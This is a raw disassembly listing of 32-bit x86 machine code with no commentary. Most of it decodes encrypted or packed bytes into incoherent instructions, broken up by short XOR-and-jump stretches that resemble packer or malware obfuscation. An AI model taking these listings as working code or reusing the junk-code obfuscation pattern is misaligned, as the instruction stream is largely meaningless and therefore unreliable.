  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	adc    al,BYTE PTR [esi]
  405173:	sahf   
  405174:	sub    al,0xf6
  405176:	sub    al,0x7e
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x405156
  40517e:	add    ecx,DWORD PTR [ebp-0x77824fbd]
  405184:	je     0x405187
  405186:	scas   al,BYTE PTR es:[edi]
  405187:	popa   
  405188:	mov    edi,0x11e9f7f7
  40518d:	je     0x4051be
  40518f:	out    0x7,al
  405191:	sbb    eax,0xa236a99b
  405196:	xchg   DWORD PTR gs:[ebx],edx
  405199:	jnp    0x405193
  40519b:	inc    esi
  40519c:	fst    QWORD PTR [esi+0x55]
  40519f:	ficom  WORD PTR [ebx+edi*1+0x4e]
  4051a3:	shl    DWORD PTR [edi+0x2f],0xfa
  4051a7:	sbb    esi,esp
  4051a9:	pusha  
  4051aa:	xchg   ecx,eax
  4051ab:	mov    esp,0x2daa32da
  4051b0:	(bad)  
  4051b1:	out    dx,eax
  4051b2:	cmp    esp,0xffffffec
  4051b5:	add    esi,edi
  4051b7:	jge    0x40518a
  4051b9:	xchg   ebp,eax
  4051ba:	pop    es
  4051bb:	aaa    
  4051bc:	out    dx,al
  4051bd:	jae    0x4051e8
  4051bf:	popa   
  4051c0:	stc    
  4051c1:	enter  0xd566,0xd7
  4051c5:	xor    esi,DWORD PTR [esi+0x73df2399]
  4051cb:	outs   dx,DWORD PTR ds:[esi]
  4051cc:	add    al,0x5a
  4051ce:	sar    DWORD PTR [esi+ecx*4],1
  4051d1:	loopne 0x405172
  4051d3:	xchg   esp,eax
  4051d4:	mov    al,ds:0x400514be
  4051d9:	cmp    DWORD PTR [ebx],ebp
  4051db:	adc    BYTE PTR cs:[eax+eiz*2+0x1ab76ac9],ah
  4051e3:	pop    eax
  4051e4:	mov    dl,0x65
  4051e6:	inc    ebp
  4051e7:	outs   dx,DWORD PTR ds:[esi]
  4051e8:	shl    BYTE PTR [ebx-0xd8221cf],cl
  4051ee:	cwde   
  4051ef:	mov    ch,0x78
  4051f1:	push   esi
  4051f2:	mov    cl,0x68
  4051f4:	adc    DWORD PTR [esi-0x5b],0x6a53a65
  4051fb:	add    al,0x66
  4051fd:	push   ebx
  4051fe:	xchg   ebp,eax
  4051ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405200:	rol    BYTE PTR [ecx],1
  405202:	inc    ecx
  405203:	outs   dx,DWORD PTR ds:[esi]
  405204:	cmp    eax,0xe1243b35
  405209:	jl     0x4051f3
  40520b:	sbb    ah,BYTE PTR [esi+0x14]
  40520e:	das    
  40520f:	mov    bl,0xa7
  405211:	inc    esi
  405212:	pop    eax
  405213:	push   esp
  405214:	push   ecx
  405215:	mov    eax,es
  405217:	inc    eax
  405218:	mov    ah,0x93
  40521a:	dec    ebx
  40521b:	jmp    0xb167:0xd9b33458
  405222:	xor    DWORD PTR [eax+eax*2],esp
  405225:	sahf   
  405226:	fimul  DWORD PTR [ebx]
  405228:	imul   esi,edi,0x71
  40522b:	xor    eax,0xffe9c4bf
  405230:	xor    al,0x97
  405232:	and    esp,edx
  405234:	out    dx,eax
  405235:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405236:	dec    ebx
  405237:	out    0x69,al
  405239:	xchg   ebp,eax
  40523a:	stc    
  40523b:	dec    DWORD PTR [edi]
  40523d:	adc    al,0x69
  40523f:	adc    ebx,DWORD PTR [ebx]
  405241:	scas   al,BYTE PTR es:[edi]
  405242:	ret    0x26d2
  405245:	mov    ah,0xf5
  405247:	adc    bl,dh
  405249:	or     edx,esp
  40524b:	push   0x22
  40524d:	mov    eax,ds:0xd3d36a09
  405252:	sbb    al,0x9a
  405254:	xor    bh,BYTE PTR [esi-0x578a2f94]
  40525a:	fist   DWORD PTR [eax]
  40525c:	retf   
  40525d:	xor    edx,ecx
  40525f:	jne    0x40522b
  405261:	mov    cl,0xfd
  405263:	xlat   BYTE PTR ds:[ebx]
  405264:	mov    eax,0x695f0ed1
  405269:	ss sbb BYTE PTR fs:[ebp+0x2a],0x7d
  40526f:	sub    eax,0x1db8781a
  405274:	or     esp,DWORD PTR [edx+0x77]
  405277:	mov    eax,0x7f19037f
  40527c:	and    DWORD PTR [ecx-0x7d],ebx
  40527f:	(bad)  
  405280:	loop   0x4052f0
  405282:	adc    esp,DWORD PTR [ebp-0x68]
  405285:	add    BYTE PTR [esi+0xf],ch
  405288:	fsub   st,st(5)
  40528a:	pop    esi
  40528b:	iret   
  40528c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40528d:	mov    dl,0xb6
  40528f:	iret   
  405290:	jle    0x405293
  405292:	icebp  
  405293:	xor    eax,DWORD PTR [edi+0x920e6c1]
  405299:	sub    DWORD PTR [ebx],esp
  40529b:	dec    dx
  40529d:	mov    cl,0xc6
  40529f:	jae    0x4052f9
  4052a1:	int3   
  4052a2:	pop    esp
  4052a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052a4:	inc    esi
  4052a5:	jbe    0x405267
  4052a7:	outs   dx,BYTE PTR ds:[esi]
  4052a8:	push   ax
  4052aa:	xlat   BYTE PTR ds:[ebx]
  4052ab:	scas   al,BYTE PTR es:[edi]
  4052ac:	or     al,0xf7
  4052ae:	dec    eax
  4052af:	and    al,bh
  4052b1:	into   
  4052b2:	in     eax,dx
  4052b3:	and    ebp,edi
  4052b5:	xchg   ebx,eax
  4052b6:	(bad)  
  4052b7:	and    edx,eax
  4052b9:	(bad)  
  4052ba:	stc    
  4052bb:	xlat   BYTE PTR ds:[ebx]
  4052bc:	or     bl,BYTE PTR [esi]
  4052be:	add    DWORD PTR [ebx-0x34],eax
  4052c1:	mov    DWORD PTR [edx+0x285553cb],eax
  4052c7:	ins    DWORD PTR es:[edi],dx
  4052c8:	jmp    0x40525c
  4052ca:	push   es
  4052cb:	test   DWORD PTR ds:[eax+0x7ef0f8ca],eax
  4052d2:	repz lds ebx,FWORD PTR [edx]
  4052d5:	cli    
  4052d6:	in     al,0x69
  4052d8:	jecxz  0x405326
  4052da:	inc    ecx
  4052db:	xchg   ecx,eax
  4052dc:	enter  0xabb0,0x8c
  4052e0:	push   ds
  4052e1:	pop    ecx
  4052e2:	push   esi
  4052e3:	pop    eax
  4052e4:	sbb    ebp,DWORD PTR [ebx+esi*8]
  4052e7:	fwait
  4052e8:	cmp    edx,edi
  4052ea:	(bad)  
  4052eb:	jae    0x405306
  4052ed:	adc    BYTE PTR [ebp+0x4a],bh
  4052f0:	fsubr  QWORD PTR [ebp+0x6798f0ea]
  4052f6:	xor    eax,0x8a3e90ad
  4052fb:	pop    es
  4052fc:	call   0x16a9:0x13bed971
  405303:	(bad)  
  405304:	std    
  405305:	pop    edx
  405306:	inc    edi
  405307:	outs   dx,DWORD PTR ds:[esi]
  405308:	mov    ebp,0xb511da33
  40530d:	shl    BYTE PTR [esi+ecx*1-0x411d8724],0x3e
  405315:	add    bh,BYTE PTR [edi-0x60]
  405318:	and    cl,dh
  40531a:	sbb    bh,BYTE PTR [eax+0xb]
  40531d:	call   0x976a4169
  405322:	or     ch,BYTE PTR [edx+0x160c2bba]
  405328:	popf   
  405329:	leave  
  40532a:	mov    al,0x3d
  40532c:	mov    eax,0xedaa94ba
  405331:	ror    DWORD PTR [eax+0x1e4a405d],cl
  405337:	mov    ds:0xe3b10ee6,al
  40533c:	xor    BYTE PTR [edi+0x1b],0x34
  405340:	xchg   edi,eax
  405341:	xor    BYTE PTR [edi-0x112a4293],bl
  405347:	add    bl,BYTE PTR [ebp-0x4974506b]
  40534d:	xor    eax,0x92394274
  405352:	fcomp  st(2)
  405354:	jl     0x405339
  405356:	dec    ebp
  405357:	mov    ?,WORD PTR [edx-0x6a]
  40535a:	pop    esp
  40535b:	xchg   edi,eax
  40535c:	push   ebp
  40535d:	call   0x68a6:0x64442411
  405364:	mov    dl,0xdc
  405366:	inc    ebp
  405367:	add    al,bl
  405369:	pushf  
  40536a:	jp     0x4053aa
  40536c:	out    dx,eax
  40536d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40536e:	mov    ebx,0x531ed4b4
  405373:	ja     0x405364
  405375:	sbb    ah,BYTE PTR [edi]
  405377:	in     al,0x79
  405379:	xchg   edx,eax
  40537a:	sub    eax,DWORD PTR [edx-0x1c89fbb7]
  405380:	jmp    0xa70f:0xe2bb7478
  405387:	(bad)  
  405388:	outs   dx,DWORD PTR ds:[esi]
  405389:	imul   esi,DWORD PTR [ebp+ebx*1+0x6f93b9b0],0xffffffc5
  405391:	pop    edi
  405392:	sub    eax,0xf67ab6dc
  405397:	xchg   esp,eax
  405398:	xor    dl,dh
  40539a:	mov    eax,ds:0x4d1ea06a
  40539f:	dec    esi
  4053a0:	mov    ch,0x83
  4053a2:	icebp  
  4053a3:	pop    DWORD PTR [esi-0x2fad8ce2]
  4053a9:	mov    ebp,0x8156b350
  4053ae:	daa    
  4053af:	pop    esi
  4053b0:	mov    ds:0x3e620292,al
  4053b5:	outs   dx,BYTE PTR ds:[esi]
  4053b6:	sbb    DWORD PTR [ebp+0x69],esp
  4053b9:	xlat   BYTE PTR ds:[ebx]
  4053ba:	xlat   BYTE PTR ds:[ebx]
  4053bb:	cld    
  4053bc:	push   ebp
  4053bd:	fidiv  WORD PTR [eax-0x9]
  4053c0:	repz hlt 
  4053c2:	fisttp QWORD PTR [esp+esi*1]
  4053c5:	mov    bh,0x5f
  4053c7:	xor    eax,0x71fb2709
  4053cc:	call   0x4c02:0x18d4cdf2
  4053d3:	add    al,0x91
  4053d5:	pop    eax
  4053d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053d7:	in     al,0xb7
  4053d9:	int3   
  4053da:	pop    edx
  4053db:	ror    DWORD PTR [esi+0x62171dc0],cl
  4053e1:	out    dx,eax
  4053e2:	(bad)  
  4053e3:	sub    al,0xe7
  4053e5:	xchg   edx,eax
  4053e6:	mov    ds:0xe51870d0,eax
  4053eb:	mov    bh,0xae
  4053ed:	(bad)  
  4053ee:	pop    esi
  4053ef:	mov    ds:0x134e3906,eax
  4053f4:	and    DWORD PTR [ebx],ecx
  4053f6:	adc    DWORD PTR ds:[ecx],esi
  4053f9:	daa    
  4053fa:	in     al,0xd5
  4053fc:	test   eax,0x4ee7444d
  405401:	fst    DWORD PTR [edi+0x8]
  405405:	stc    
  405406:	mov    WORD PTR [esi-0x75],0xa72d
  40540c:	fmul   st,st(0)
  40540e:	jecxz  0x405451
  405410:	dec    edi
  405411:	in     eax,dx
  405412:	or     cl,BYTE PTR [ebp-0x7d]
  405415:	cli    
  405416:	in     eax,dx
  405417:	mov    ecx,0x4bc49f1b
  40541c:	sub    DWORD PTR [edx],0xfffffffe
  40541f:	sbb    DWORD PTR [edx],edi
  405421:	rcr    DWORD PTR [edx],cl
  405423:	imul   edx,DWORD PTR [esp+eiz*8+0xc],0x58
  405428:	add    eax,0x11ca14e7
  40542d:	lock in eax,0x9a
  405430:	adc    DWORD PTR [ebp+0x5b],0xf768b32
  405437:	jmp    0x967e9732
  40543c:	in     al,dx
  40543d:	mov    eax,0xe335709d
  405442:	push   cs
  405443:	mov    esp,0xcffca607
  405448:	hlt    
  405449:	push   0xffffffc7
  40544b:	sub    al,0x56
  40544d:	leave  
  40544e:	arpl   WORD PTR [ebx+0x1e0b3496],si
  405454:	xor    BYTE PTR [eax+0x11],cl
  405457:	cs xor dh,dl
  40545a:	adc    BYTE PTR [eax+0x34],bl
  40545d:	test   DWORD PTR [eax-0x296f366d],ebx
  405463:	cmp    edi,edx
  405465:	jbe    0x404ac0
  40546b:	mov    edx,DWORD PTR [ebp-0xc]
  40546e:	mov    edi,DWORD PTR [ebp-0x24]
  405471:	jmp    0x405774
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi+0x657ffbb8]
  405484:	popf   
  405485:	stos   DWORD PTR es:[edi],eax
  405486:	shr    BYTE PTR [ebx],1
  405488:	jle    0x405508
  40548a:	pop    eax
  40548b:	jl     0x40550b
  40548d:	jle    0x40548e
  40548f:	or     BYTE PTR [edi+0x77],0x3b
  405493:	pop    esp
  405494:	stos   BYTE PTR es:[edi],al
  405495:	or     ah,BYTE PTR [eax+ebx*4-0x7a]
  405499:	ja     0x405441
  40549b:	repz popa 
  40549d:	dec    edx
  40549e:	add    dl,al
  4054a0:	inc    esi
  4054a1:	arpl   WORD PTR [ecx],sp
  4054a3:	push   0xffffffac
  4054a5:	xchg   edi,eax
  4054a6:	jnp    0x405480
  4054a8:	les    ebp,FWORD PTR [ebx+edx*2-0x62]
  4054ac:	jne    0x405468
  4054ae:	shl    BYTE PTR [esi],1
  4054b0:	adc    DWORD PTR [esi],ebp
  4054b2:	push   edi
  4054b3:	sub    esp,DWORD PTR [ebx+0x6a]
  4054b6:	inc    edi
  4054b7:	mov    dh,0x3b
  4054b9:	jne    0x4054f7
  4054bb:	sar    BYTE PTR [esi-0x71],cl
  4054be:	pop    ecx
  4054bf:	in     al,dx
  4054c0:	ret    
  4054c1:	jae    0x40546a
  4054c3:	out    dx,al
  4054c4:	rol    DWORD PTR [esi],0x98
  4054c7:	mov    esi,0xda879064
  4054cc:	dec    ecx
  4054cd:	pop    ecx
  4054ce:	mov    esp,ds
  4054d0:	out    0xa4,eax
  4054d2:	fcom   QWORD PTR [esi-0x36]
  4054d5:	addr16 jmp 0x40546c
  4054d8:	push   ebx
  4054d9:	pop    eax
  4054da:	ins    BYTE PTR es:[edi],dx
  4054db:	inc    ebp
  4054dc:	inc    ecx
  4054dd:	mov    ebx,DWORD PTR [edi-0x153bf274]
  4054e3:	popf   
  4054e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054e5:	cwde   
  4054e6:	jmp    0x40555f
  4054e8:	mov    BYTE PTR [ebx-0x46],0xf8
  4054ec:	or     DWORD PTR [ebp+0x4b2a6b3d],ecx
  4054f2:	mov    dh,0xea
  4054f4:	xchg   BYTE PTR [eax-0x43],bh
  4054f7:	lahf   
  4054f8:	pop    edi
  4054f9:	jns    0x40555f
  4054fb:	cmp    cl,BYTE PTR [ebx+0x3b]
  4054fe:	(bad)  
  405500:	jo     0x405527
  405502:	mov    si,0x6a85
  405506:	jmp    FWORD PTR [eax+0x3cd7b8e5]
  40550c:	orps   xmm0,XMMWORD PTR [ebp-0x5ac593e2]
  405513:	aas    
  405514:	jne    0x405528
  405516:	ror    BYTE PTR [esi-0x2a],cl
  405519:	mov    esi,0xa5c49817
  40551e:	loope  0x4054c5
  405520:	push   ecx
  405521:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405522:	or     al,0x97
  405524:	cmc    
  405525:	or     al,0x7a
  405527:	cmp    ah,BYTE PTR [ebx-0x1d]
  40552a:	sub    eax,edx
  40552c:	mov    dh,0xaf
  40552e:	test   eax,0x3d9781af
  405533:	mov    ebx,0x4157dd15
  405538:	and    edx,DWORD PTR [esi-0x3fd698ff]
  40553e:	push   esi
  40553f:	imul   esi,DWORD PTR [esi-0x3dc1c4a5],0xffffffb9
  405546:	mov    al,BYTE PTR [esi-0x329780b3]
  40554c:	cdq    
  40554d:	and    dh,dl
  40554f:	das    
  405550:	adc    eax,0x2379af15
  405555:	jecxz  0x4055b8
  405557:	test   BYTE PTR ds:0x9edb40e,ch
  40555d:	std    
  40555e:	dec    esp
  40555f:	aad    0xc1
  405561:	dec    eax
  405562:	out    dx,al
  405563:	mov    dh,0xc4
  405565:	ficom  WORD PTR [eax-0x33]
  405568:	adc    al,BYTE PTR ss:[ebp+0x4a3c8105]
  40556f:	dec    esi
  405570:	repz (bad) 
  405572:	and    eax,DWORD PTR gs:[ebx]
  405575:	out    0xad,al
  405577:	aam    0x9a
  405579:	test   al,0xbe
  40557b:	sbb    al,0xd
  40557d:	adc    esp,edx
  40557f:	dec    esi
  405580:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405581:	xlat   BYTE PTR ds:[ebx]
  405582:	aam    0x51
  405584:	pop    eax
  405585:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405586:	lock ficomp WORD PTR [ebx]
  405589:	adc    ah,BYTE PTR [esi+0x6a43d08f]
  40558f:	push   ss
  405590:	(bad)
  405595:	ss call 0xe2d71e35
  40559b:	ror    ch,cl
  40559d:	daa    
  40559e:	ins    DWORD PTR es:[edi],dx
  40559f:	fdivp  st(2),st
  4055a1:	xor    al,0x2
  4055a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055a4:	imul   edx,DWORD PTR [ebp-0x5b],0x93f5c78e
  4055ab:	cwde   
  4055ac:	adc    al,0xfd
  4055ae:	dec    ebx
  4055af:	sbb    dl,BYTE PTR [ecx+ebx*8-0x29b5d90d]
  4055b6:	pop    ebx
  4055b7:	or     dh,al
  4055b9:	clc    
  4055ba:	pop    esi
  4055bb:	or     al,0xac
  4055bd:	fisttp DWORD PTR [eax+edx*8+0x71]
  4055c1:	and    DWORD PTR [edi+esi*1-0x236c2b6e],0xffffff82
  4055c9:	loope  0x40556d
  4055cb:	arpl   WORD PTR [esi+eax*4-0x3ba84197],ax
  4055d2:	fidiv  WORD PTR [edx-0x32]
  4055d5:	bnd ja 0x4055ac
  4055d8:	sbb    eax,0x3d3b928d
  4055dd:	sub    DWORD PTR [eax-0x1903fb87],edi
  4055e3:	add    eax,DWORD PTR [edx]
  4055e5:	fcomi  st,st(5)
  4055e7:	int    0x10
  4055e9:	jmp    0x6e2:0xf6ff41e0
  4055f0:	and    dl,BYTE PTR [ecx-0xf041ba6]
  4055f6:	mov    DWORD PTR [esi+0x29],eax
  4055f9:	outs   dx,DWORD PTR ds:[esi]
  4055fa:	jo     0x4055e9
  4055fc:	and    DWORD PTR [esi],ebx
  4055fe:	dec    BYTE PTR [esi+0x1202d9fa]
  405604:	xchg   esp,eax
  405605:	cmp    al,0x5b
  405607:	sub    eax,0x85192b74
  40560c:	mov    ebp,0xe66f40e3
  405611:	push   ebx
  405612:	adc    dl,cl
  405614:	xor    BYTE PTR [edi],cl
  405616:	and    cl,cl
  405618:	repnz mov BYTE PTR [edx],bl
  40561b:	mov    dh,0xb7
  40561d:	jg     0x405638
  40561f:	shr    BYTE PTR [ebx+0x18],1
  405622:	add    BYTE PTR [eax+0x38],cl
  405625:	xchg   ecx,ecx
  405627:	enter  0xf66b,0xef
  40562b:	sub    BYTE PTR [ebp-0x14],cl
  40562e:	cmp    DWORD PTR [ebx],esi
  405630:	cmp    eax,0x7a67d64d
  405635:	mov    WORD PTR gs:[ebp-0x56e0e43b],ss
  40563c:	push   edi
  40563d:	fisttp WORD PTR [esp+eax*2]
  405640:	popa   
  405641:	(bad)  
  405642:	xor    DWORD PTR [edi+esi*1],0xb69b43e1
  405649:	lock imul ebp,DWORD PTR [ebp-0x24870038],0xffffffe0
  405651:	out    dx,al
  405652:	cli    
  405653:	out    dx,al
  405654:	hlt    
  405655:	test   DWORD PTR [ecx],esi
  405657:	xchg   ecx,eax
  405658:	cmp    BYTE PTR [ebp+0xe5687b2],cl
  40565e:	shl    DWORD PTR [eax-0x23],1
  405661:	mov    esp,0x9ddaa427
  405666:	mov    ch,0x71
  405668:	xchg   esi,eax
  405669:	adc    edi,0xffffffe6
  40566c:	adc    al,0x1f
  40566e:	mov    BYTE PTR [esi+0x57198973],ah
  405674:	cmp    BYTE PTR [ebp+0x6fda7069],bh
  40567a:	mov    fs,WORD PTR [ebx*1+0x783cbd78]
  405681:	mov    al,ds:0xf8cf3c5d
  405686:	(bad)  [eax]
  405688:	ret    
  405689:	xor    eax,0xf947c0ba
  40568e:	pop    ebx
  40568f:	ror    BYTE PTR [ebx-0x12d87f84],0x3f
  405696:	popf   
  405697:	psubb  mm3,QWORD PTR [ebx+0x135deb1b]
  40569e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40569f:	and    DWORD PTR ds:0x87718f,esi
  4056a5:	pop    edx
  4056a6:	sbb    DWORD PTR [ebp+0x3734dad6],ebx
  4056ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056ad:	cmp    eax,0xb3d20b7d
  4056b2:	sub    ebx,edx
  4056b4:	int    0x55
  4056b6:	pop    ds
  4056b7:	pop    es
  4056b8:	mov    edx,DWORD PTR [esi-0x7e]
  4056bb:	popa   
  4056bc:	push   0x555ee305
  4056c1:	jb     0x40564a
  4056c3:	je     0x4056fc
  4056c5:	imul   eax,ebx,0xe4179a25
  4056cb:	stos   BYTE PTR es:[edi],al
  4056cc:	or     ax,0xd60c
  4056d0:	daa    
  4056d1:	mov    eax,ss
  4056d3:	pop    ecx
  4056d4:	outs   dx,DWORD PTR ds:[si]
  4056d6:	gs push 0xb43de63a
  4056dc:	cli    
  4056dd:	fwait
  4056de:	sub    al,0x17
  4056e0:	out    dx,al
  4056e1:	mov    dl,BYTE PTR [ebp-0x75]
  4056e4:	push   cs
  4056e5:	stc    
  4056e6:	mov    edi,0x10036364
  4056eb:	lock pop edi
  4056ed:	aaa    
  4056ee:	jb     0x40573d
  4056f0:	outs   dx,BYTE PTR ds:[esi]
  4056f1:	inc    ebx
  4056f2:	(bad)  
  4056f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056f4:	mov    ah,0xcf
  4056f6:	in     eax,0x55
  4056f8:	(bad)  
  4056fb:	mov    WORD PTR [esi],ss
  4056fd:	ins    BYTE PTR es:[edi],dx
  4056fe:	cmp    BYTE PTR [eax],cl
  405700:	sbb    al,0xdd
  405702:	inc    edx
  405703:	and    DWORD PTR [edx-0x18],esp
  405706:	sub    BYTE PTR [eax+0x78],0x25
  40570a:	test   al,0x57
  40570c:	jmp    ecx
  40570e:	add    al,0x21
  405710:	mov    bl,0xed
  405712:	fwait
  405713:	inc    ebp
  405714:	stc    
  405715:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405717:	xchg   al,al
  405719:	or     eax,0x79b71ee9
  40571e:	in     al,0x6
  405720:	dec    eax
  405721:	scas   eax,DWORD PTR es:[edi]
  405722:	retf   0x94bf
  405725:	mov    WORD PTR [esi],es
  405727:	sub    bh,al
  405729:	cli    
  40572a:	mov    edx,0x58cdf65b
  40572f:	or     edx,esp
  405731:	pop    es
  405732:	mov    ebp,0x63cf8234
  405737:	adc    BYTE PTR [esi],al
  405739:	jns    0x405743
  40573b:	mov    DWORD PTR [esi+0x57692bbe],0x411409ee
  405745:	and    edi,eax
  405747:	clc    
  405748:	ja     0x405760
  40574a:	ret    
  40574b:	(bad)  
  40574c:	jmp    FWORD PTR [ecx]
  40574e:	jne    0x405707
  405750:	dec    ebx
  405751:	into   
  405752:	test   bh,bh
  405754:	scas   eax,DWORD PTR es:[edi]
  405755:	jb     0x4056f0
  405757:	inc    esi
  405758:	mov    ebp,0xd5320a55
  40575d:	out    dx,al
  40575e:	stos   DWORD PTR es:[edi],eax
  40575f:	daa    
  405760:	xor    al,0x2d
  405762:	push   eax
  405763:	inc    eax
  405764:	fcom   QWORD PTR [edx+0x3b1ee7a1]
  40576a:	call   0xaa5b:0x3078bb54
  405771:	pop    ecx
  405772:	ins    DWORD PTR es:[edi],dx
  405773:	mov    bh,0x33
  405775:	rol    BYTE PTR [ebx],1
  405777:	ror    DWORD PTR [edi],1
  405779:	scas   eax,DWORD PTR es:[edi]
  40577a:	xlat   BYTE PTR ds:[ebx]
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43379b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x4336a3,0x433683
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x4336df
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0xb7
  4057f5:	mov    ecx,0x363a0de2
  4057fa:	jle    0x40587a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	imul   ebp,DWORD PTR [edx-0x2fad393b],0x3d
  405807:	call   0x7a0933d
  40580c:	leave  
  40580d:	sar    DWORD PTR [eax-0x31],0x5d
  405811:	sahf   
  405812:	xor    al,BYTE PTR [edi-0x20]
  405815:	inc    esp
  405816:	aaa    
  405817:	and    DWORD PTR [esi],esp
  405819:	pop    ecx
  40581a:	dec    edx
  40581b:	icebp  
  40581c:	jp     0x405814
  40581e:	loope  0x405837
  405820:	jmp    0x7d9b19d1
  405825:	mov    al,ds:0xb468859b
  40582a:	jle    0x4057ca
  40582c:	loope  0x405807
  40582e:	inc    eax
  40582f:	pop    ebp
  405830:	in     al,dx
  405831:	int3   
  405832:	int3   
  405833:	in     eax,dx
  405834:	jne    0x405821
  405836:	xchg   edx,eax
  405838:	and    al,0x27
  40583a:	lahf   
  40583b:	mov    al,cl
  40583d:	adc    DWORD PTR [eax+0x7a56c7ea],ebx
  405843:	pop    edx
  405844:	out    dx,eax
  405845:	rcr    DWORD PTR [ebx],cl
  405847:	add    BYTE PTR [edi-0x5c1fd980],al
  40584d:	push   cs
  40584e:	(bad)  
  40584f:	repz pop edx
  405851:	fidiv  DWORD PTR [ebx]
  405853:	stos   BYTE PTR es:[edi],al
  405854:	or     ecx,DWORD PTR [esp+edi*4+0x317596b8]
  40585b:	idiv   dl
  40585d:	aaa    
  40585e:	mov    edi,0x7fab8ca6
  405863:	xchg   DWORD PTR [eax],ecx
  405865:	out    dx,eax
  405866:	(bad)  
  405867:	sub    al,0xbc
  405869:	cdq    
  40586a:	pop    esi
  40586b:	jne    0x405805
  40586d:	in     al,0x1a
  40586f:	mov    dl,0xdc
  405871:	xchg   ebp,eax
  405872:	je     0x405828
  405874:	push   ecx
  405875:	push   ds
  405876:	and    BYTE PTR [eax],0xd5
  405879:	inc    ebp
  40587a:	jne    0x405857
  40587c:	fstp   QWORD PTR [ebp+eax*8-0x21193a4a]
  405883:	sbb    ebx,DWORD PTR [edx+0x72]
  405886:	jne    0x40582d
  405888:	outs   dx,DWORD PTR ds:[esi]
  405889:	sbb    DWORD PTR [edi+0x59],edx
  40588c:	js     0x4058cc
  40588e:	xchg   esi,eax
  40588f:	inc    ebp
  405890:	out    dx,eax
  405891:	adc    al,0xa7
  405893:	sti    
  405894:	push   ecx
  405895:	sbb    eax,0xd8a0f922
  40589a:	sub    bl,BYTE PTR [ecx-0x62]
  40589d:	test   BYTE PTR [ebp+0x73],bh
  4058a0:	shl    BYTE PTR [eax],0xe1
  4058a3:	mov    ch,0x1
  4058a5:	icebp  
  4058a6:	xor    al,0x56
  4058a8:	xchg   esp,eax
  4058a9:	mov    bl,0xb9
  4058ab:	mov    bl,0xb5
  4058ad:	in     al,0x45
  4058af:	pop    esi
  4058b0:	(bad)  
  4058b1:	adc    ah,BYTE PTR [eax]
  4058b3:	call   0xf03160cf
  4058b8:	push   0xb55dfb6f
  4058bd:	xchg   cx,ax
  4058bf:	pop    es
  4058c0:	call   0xd8f0:0xa459c970
  4058c7:	inc    esp
  4058c8:	mov    al,ds:0xab90e0a2
  4058cd:	jl     0x405939
  4058cf:	push   esp
  4058d0:	or     esp,DWORD PTR [esi+0x4a]
  4058d3:	jmp    0x8f262fdf
  4058d8:	les    esi,FWORD PTR cs:0x227db88b
  4058df:	jmp    0x37eaa6a3
  4058e4:	test   al,0xb6
  4058e6:	sti    
  4058e7:	jno    0x4058c5
  4058e9:	rcr    BYTE PTR [esp+edx*1],0xa5
  4058ed:	outs   dx,DWORD PTR ds:[esi]
  4058ee:	cmp    eax,0xbcec0dd3
  4058f3:	or     eax,0x2d296d72
  4058f8:	scas   eax,DWORD PTR es:[edi]
  4058f9:	mov    DWORD PTR [edx-0xe010ba6],esp
  4058ff:	mov    cs,WORD PTR ds:0x291460f5
  405905:	xchg   esp,eax
  405906:	jo     0x405963
  405908:	mov    eax,ds:0x222eca51
  40590d:	in     eax,0x41
  40590f:	(bad)  
  405910:	mov    edx,DWORD PTR gs:[ebx+ebp*4]
  405914:	cmp    BYTE PTR [eax+0x13],dl
  405917:	mov    eax,ds:0x59ff2245
  40591c:	sti    
  40591d:	push   esi
